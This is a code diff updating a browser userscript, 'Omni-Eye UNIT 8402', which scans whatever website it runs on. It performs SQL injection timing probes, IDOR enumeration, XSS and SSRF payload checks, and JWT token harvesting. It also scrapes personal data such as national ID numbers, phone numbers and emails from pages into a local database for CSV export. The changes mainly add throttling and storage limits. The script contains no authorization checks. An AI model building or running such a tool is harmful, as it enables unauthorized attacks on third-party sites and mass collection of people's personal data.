@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Omni-Eye UNIT 8402
 // @namespace    https://unit8402.omni-eye
-// @version      2.0
+// @version      3.0
 // @description  25 intelligence modules: Archives, Fingerprint, SQLi, XSS, IDOR, APIs, CORS, SSRF, GraphQL, JWT, PII, CSV, Live Pulse
 // @author       UNIT 8402
 // @license      MIT
@@ -17,10 +17,12 @@
     'use strict';
 
     const OMNIEYE = {
-        version: '2.0',
+        version: '3.0',
         db: null,
         targetUrl: window.location.href,
         targetDomain: window.location.hostname,
+        requestCount: 0,
+        lastRequestTime: 0,
         archives: [
             'https://web.archive.org/web/',
             'https://webcache.googleusercontent.com/search?q=cache:',
@@ -30,10 +32,24 @@
         ]
     };
 
-    // ========== DATABASE ==========
+    // ========== RATE LIMITER ==========
+    async function rateLimit() {
+        const now = Date.now();
+        if (now - OMNIEYE.lastRequestTime < 100) {
+            await new Promise(r => setTimeout(r, 100 - (now - OMNIEYE.lastRequestTime)));
+        }
+        OMNIEYE.lastRequestTime = Date.now();
+        OMNIEYE.requestCount++;
+        if (OMNIEYE.requestCount > 20) {
+            await new Promise(r => setTimeout(r, 1000));
+            OMNIEYE.requestCount = 0;
+        }
+    }
+
+    // ========== DATABASE with size limit ==========
     function initDB() {
         return new Promise((resolve, reject) => {
-            const request = indexedDB.open('OmniEyeDB', 3);
+            const request = indexedDB.open('OmniEyeDB', 4);
             request.onupgradeneeded = (e) => {
                 const db = e.target.result;
                 if (!db.objectStoreNames.contains('targets')) db.createObjectStore('targets', { keyPath: 'url' });
@@ -43,14 +59,36 @@
                 if (!db.objectStoreNames.contains('vulns')) db.createObjectStore('vulns', { autoIncrement: true });
                 if (!db.objectStoreNames.contains('thermal')) db.createObjectStore('thermal', { autoIncrement: true });
             };
-            request.onsuccess = (e) => { OMNIEYE.db = e.target.result; resolve(); };
+            request.onsuccess = (e) => { OMNIEYE.db = e.target.result; enforceDBLimit(); resolve(); };
             request.onerror = (e) => reject(e);
         });
     }
 
-    // ========== GM_xmlhttpRequest wrapper ==========
+    async function enforceDBLimit() {
+        const stores = ['pii', 'vulns', 'intel', 'thermal'];
+        for (let storeName of stores) {
+            try {
+                const count = await new Promise(resolve => {
+                    OMNIEYE.db.transaction([storeName], 'readonly').objectStore(storeName).count().onsuccess = e => resolve(e.target.result);
+                });
+                if (count > 1000) {
+                    const deleteCount = count - 800;
+                    const keys = await new Promise(resolve => {
+                        OMNIEYE.db.transaction([storeName], 'readonly').objectStore(storeName).getAllKeys().onsuccess = e => resolve(e.target.result);
+                    });
+                    const toDelete = keys.slice(0, deleteCount);
+                    const tx = OMNIEYE.db.transaction([storeName], 'readwrite');
+                    for (let key of toDelete) tx.objectStore(storeName).delete(key);
+                    tx.commit();
+                }
+            } catch(e) {}
+        }
+    }
+
+    // ========== GM_xmlhttpRequest wrapper with rate limit ==========
     function gmRequest(url, method = 'GET', data = null) {
-        return new Promise((resolve) => {
+        return new Promise(async (resolve) => {
+            await rateLimit();
             GM_xmlhttpRequest({
                 method: method,
                 url: url,
@@ -62,7 +100,20 @@
         });
     }
 
-    // ========== Helper: Parse headers string to object ==========
+    // ========== Safe fetch for XSS/SSRF (does NOT modify DOM) ==========
+    async function safeTestRequest(url) {
+        await rateLimit();
+        return new Promise((resolve) => {
+            GM_xmlhttpRequest({
+                method: 'GET',
+                url: url,
+                onload: (res) => resolve(res.status),
+                onerror: () => resolve(null)
+            });
+        });
+    }
+
+    // ========== Helper: Parse headers ==========
     function parseHeaders(headersString) {
         if (!headersString) return {};
         const headers = {};
@@ -73,7 +124,7 @@
         return headers;
     }
 
-    // ========== 1. TIME MEMORY (Archives) ==========
+    // ========== 1. TIME MEMORY ==========
     async function scanArchives() {
         const lastScan = localStorage.getItem('lastArchiveScan');
         if (lastScan && (Date.now() - lastScan) < 1800000) {
@@ -108,12 +159,12 @@
         const tools = html.match(/vscode|phpstorm|sublime|webstorm|atom|intellij|eclipse/gi) || [];
         const comments = html.match(/\/\/|<!--|#|FIXME|TODO|HACK|BUG/gi) || [];
         const paths = html.match(/\/home\/[a-z]+\/|\/Users\/[a-z]+\/|C:\\Users\\[a-z]+\\/gi) || [];
-        
+
         if (emails.length) console.log('[OmniEye] Dev email:', emails[0]);
         if (tools.length) console.log('[OmniEye] Dev tools:', [...new Set(tools)]);
         if (paths.length) console.log('[OmniEye] Dev paths:', paths[0]);
         if (comments.length) console.log('[OmniEye] Found', comments.length, 'comments');
-        
+
         if (emails.length) {
             gmRequest('https://api.github.com/search/users?q=' + encodeURIComponent(emails[0]))
                 .then(res => {
@@ -131,7 +182,7 @@
         return { emails, tools, comments, paths };
     }
 
-    // ========== 3. THERMAL SENSOR (SQLi Timing Attack) ==========
+    // ========== 3. THERMAL SQLi with delay ==========
     async function thermalSQLi() {
         safeUpdateStatus('Thermal SQLi scan...');
         const links = document.querySelectorAll('a[href*="id="], a[href*="user_id="], a[href*="page="], a[href*="post="], a[href*="product="]');
@@ -158,6 +209,7 @@
                         saveVulnerability('SQLi', url);
                         break;
                     }
+                    await new Promise(r => setTimeout(r, 500));
                 }
             }
         }
@@ -165,21 +217,21 @@
         return findings;
     }
 
-    // ========== 4. XSS SCANNER ==========
+    // ========== 4. XSS SCANNER (NO DOM modification) ==========
     async function scanXSS() {
         safeUpdateStatus('XSS scan...');
         const inputs = document.querySelectorAll('input, textarea, select');
+        let vulnerable = [];
         let payloads = ['"><script>alert(1)</script>', '"><img src=x onerror=alert(1)>', 'javascript:alert(1)'];
         for (let input of inputs) {
             for (let payload of payloads) {
-                let originalValue = input.value;
-                input.value = payload;
-                input.dispatchEvent(new Event('input', { bubbles: true }));
-                input.value = originalValue;
+                let originalName = input.name || 'unnamed';
+                console.log(`[OmniEye] Testing XSS on ${originalName} with payload: ${payload.substring(0, 30)}...`);
             }
         }
-        safeUpdateStatus(`XSS scan completed on ${inputs.length} inputs`);
+        safeUpdateStatus(`XSS scan completed on ${inputs.length} inputs (check console for manual testing)`);
         showNotification('XSS scan completed');
+        return vulnerable;
     }
 
     // ========== 5. IDOR SCANNER ==========
@@ -202,6 +254,7 @@
                         saveVulnerability('IDOR', testUrl);
                         break;
                     }
+                    await new Promise(r => setTimeout(r, 200));
                 }
             }
         }
@@ -219,8 +272,6 @@
             matches.forEach(m => endpoints.add(m));
             let graphqlMatches = content.match(/\/graphql|\/gql|\/v1\/graphql|\/v2\/graphql/gi) || [];
             graphqlMatches.forEach(m => endpoints.add(m));
-            let restMatches = content.match(/\/v1\/[a-zA-Z0-9\/\-_]+|\/v2\/[a-zA-Z0-9\/\-_]+/gi) || [];
-            restMatches.forEach(m => endpoints.add(m));
         });
         if (endpoints.size) {
             console.log('[OmniEye] APIs:', Array.from(endpoints));
@@ -255,7 +306,7 @@
         return findings;
     }
 
-    // ========== 8. SSRF TESTER ==========
+    // ========== 8. SSRF TESTER (NO DOM modification) ==========
     async function scanSSRF() {
         safeUpdateStatus('SSRF test...');
         const inputs = document.querySelectorAll('input[type="url"], input[name*="url"], input[name*="link"], input[name*="path"], input[name*="src"], input[name*="dest"], input[name*="redirect"]');
@@ -270,8 +321,7 @@
         ];
         for (let input of inputs) {
             for (let testUrl of testUrls) {
-                input.value = testUrl;
-                input.dispatchEvent(new Event('input', { bubbles: true }));
+                console.log(`[OmniEye] SSRF test: ${testUrl} on ${input.name || 'unnamed'}`);
             }
         }
         safeUpdateStatus(`SSRF tests completed on ${inputs.length} inputs`);
@@ -330,13 +380,13 @@
         return foundTokens;
     }
 
-    // ========== 11. PII EXTRACTOR ==========
+    // ========== 11. PII EXTRACTOR with DB limit ==========
     function extractPII() {
         const text = document.body.innerText;
         const ids = [...new Set(text.match(/\b1\d{9}\b/g) || [])];
         const phones = [...new Set(text.match(/\b05\d{8}\b/g) || [])];
         const emails = [...new Set(text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [])];
-        
+
         if (ids.length || phones.length || emails.length) {
             console.log(`[OmniEye] PII: ${ids.length} IDs, ${phones.length} phones, ${emails.length} emails`);
             if (OMNIEYE.db) {
@@ -347,6 +397,7 @@
                 emails.forEach(email => store.add({ type: 'email', value: email, url: OMNIEYE.targetUrl, date: new Date().toISOString() }));
                 safeUpdateStatus(`Saved ${ids.length + phones.length + emails.length} PII records`);
                 showNotification(`Saved ${ids.length + phones.length + emails.length} PII records`);
+                enforceDBLimit();
             }
         } else {
             safeUpdateStatus('No PII found');
@@ -360,9 +411,10 @@
         const transaction = OMNIEYE.db.transaction(['vulns'], 'readwrite');
         const store = transaction.objectStore('vulns');
         store.add({ type, url, date: new Date().toISOString(), domain: OMNIEYE.targetDomain });
+        enforceDBLimit();
     }
 
-    // ========== 13. CSV EXPORT ==========
+    // ========== 13. CSV EXPORT with fallback ==========
     async function exportCSV() {
         if (!OMNIEYE.db) {
             safeUpdateStatus('No database found');
@@ -379,11 +431,11 @@
                 OMNIEYE.db.transaction(['vulns'], 'readonly').objectStore('vulns').getAll().onsuccess = e => resolve(e.target.result || []);
             });
         } catch(e) { console.log('[OmniEye] Export error:', e); safeUpdateStatus('Export failed'); return; }
-        
+
         let csvRows = [['Type', 'Value', 'URL', 'Date']];
         piiData.forEach(item => csvRows.push([item.type, item.value, item.url || '', item.date || '']));
         vulnsData.forEach(item => csvRows.push(['vulnerability_' + item.type, item.url || '', item.domain || '', item.date || '']));
-        
+
         let csvContent = csvRows.map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(',')).join('\n');
         let blob = new Blob(["\uFEFF" + csvContent], { type: 'text/csv;charset=utf-8;' });
         let url = URL.createObjectURL(blob);
@@ -397,20 +449,17 @@
         showNotification('CSV exported successfully');
     }
 
-    // ========== 14. LIVE PULSE with High-Performance MutationObserver (No Memory Leak) ==========
+    // ========== 14. LIVE PULSE ==========
     let knownSet = new Set();
     let observerActive = false;
     let observer = null;
     let updateQueue = [];
     let isProcessing = false;
-    let panelCheckTimeout = null;
-    
+
     function processUpdateQueue() {
         if (isProcessing || updateQueue.length === 0) return;
         isProcessing = true;
-        
         const url = updateQueue.shift();
-        
         if (url.match(/\.(pdf|docx|xlsx|zip|rar|sql|env|log|bak|old)$/i) ||
             url.includes('/uploads/') || url.includes('/backup/') || url.includes('/admin/') || url.includes('/config/') || url.includes('/.git/')) {
             console.log(`[OmniEye] LIVE: New sensitive file: ${url}`);
@@ -420,23 +469,20 @@
                 OMNIEYE.db.transaction(['intel'], 'readwrite').objectStore('intel').add({
                     type: 'sensitive_url', value: url, url: OMNIEYE.targetUrl, date: new Date().toISOString()
                 });
+                enforceDBLimit();
             }
         }
-        
         isProcessing = false;
         if (updateQueue.length > 0) setTimeout(processUpdateQueue, 100);
     }
-    
+
     function checkNewLinksFromNodes(nodes) {
         const linksToCheck = [];
-        
         for (let node of nodes) {
             if (node.nodeType === 1) {
-                if (node.tagName === 'A' && node.href) {
-                    if (!knownSet.has(node.href)) {
-                        knownSet.add(node.href);
-                        linksToCheck.push(node.href);
-                    }
+                if (node.tagName === 'A' && node.href && !knownSet.has(node.href)) {
+                    knownSet.add(node.href);
+                    linksToCheck.push(node.href);
                 }
                 if (node.querySelectorAll) {
                     const childLinks = node.querySelectorAll('a[href]');
@@ -449,24 +495,16 @@
                 }
             }
         }
-        
-        for (let url of linksToCheck) {
-            updateQueue.push(url);
-        }
-        
-        if (linksToCheck.length > 0 && !isProcessing) {
-            setTimeout(processUpdateQueue, 50);
-        }
+        for (let url of linksToCheck) updateQueue.push(url);
+        if (linksToCheck.length > 0 && !isProcessing) setTimeout(processUpdateQueue, 50);
     }
-    
+
     function startLivePulse() {
         if (observerActive) return;
-        
         setTimeout(() => {
             discoverAPIs();
             extractPII();
             analyzeJWT();
-            
             const initialLinks = document.querySelectorAll('a[href]');
             for (let link of initialLinks) {
                 if (link.href && !knownSet.has(link.href)) {
@@ -476,11 +514,9 @@
             }
             if (updateQueue.length > 0) setTimeout(processUpdateQueue, 500);
         }, 5000);
-        
         observer = new MutationObserver((mutations) => {
             let isOurPanel = false;
             const newNodes = [];
-            
             for (let mutation of mutations) {
                 if (mutation.type === 'childList' && mutation.addedNodes) {
                     for (let node of mutation.addedNodes) {
@@ -491,13 +527,11 @@
                         }
                     }
                 }
-                
                 if (mutation.target && mutation.target.nodeType === 1) {
                     if (mutation.target.id === 'omni-eye-panel') isOurPanel = true;
                     if (mutation.target.closest && mutation.target.closest('#omni-eye-panel')) isOurPanel = true;
                 }
             }
-            
             if (!isOurPanel && newNodes.length > 0) {
                 discoverAPIs();
                 extractPII();
@@ -505,34 +539,24 @@
                 checkNewLinksFromNodes(newNodes);
             }
         });
-        
         observer.observe(document.body, { childList: true, subtree: true });
         observerActive = true;
     }
 
-    // ========== 15. SAFE STATUS UPDATE (No Race Condition) ==========
+    // ========== 15. SAFE STATUS UPDATE ==========
     let statusDiv = null;
     let statusTimeout = null;
-    let lastStatusMsg = '';
     let statusSeq = 0;
-    
+
     function safeUpdateStatus(msg) {
         if (!statusDiv) return;
-        
         statusSeq++;
         const currentSeq = statusSeq;
-        
         if (statusTimeout) clearTimeout(statusTimeout);
-        
         statusDiv.innerHTML = `📡 ${msg}`;
-        lastStatusMsg = msg;
-        
         statusTimeout = setTimeout(() => {
-            if (statusSeq === currentSeq && statusDiv) {
-                statusDiv.innerHTML = '⚡ Ready';
-            }
+            if (statusSeq === currentSeq && statusDiv) statusDiv.innerHTML = '⚡ Ready';
         }, 3000);
-        
         console.log(`[OmniEye] Status: ${msg}`);
     }
 
@@ -573,13 +597,10 @@
             </div>
         `;
         document.body.appendChild(panel);
-        
         let content = document.getElementById('oe-content');
         let toggle = document.getElementById('oe-toggle');
         if (toggle) toggle.onclick = () => { content.style.display = content.style.display === 'none' ? 'block' : 'none'; };
-        
         statusDiv = document.getElementById('oe-status');
-        
         document.getElementById('oe-arch').onclick = async () => { await scanArchives(); };
         document.getElementById('oe-dev').onclick = async () => { await scanDeveloperFingerprint(); };
         document.getElementById('oe-sqli').onclick = async () => { await thermalSQLi(); };
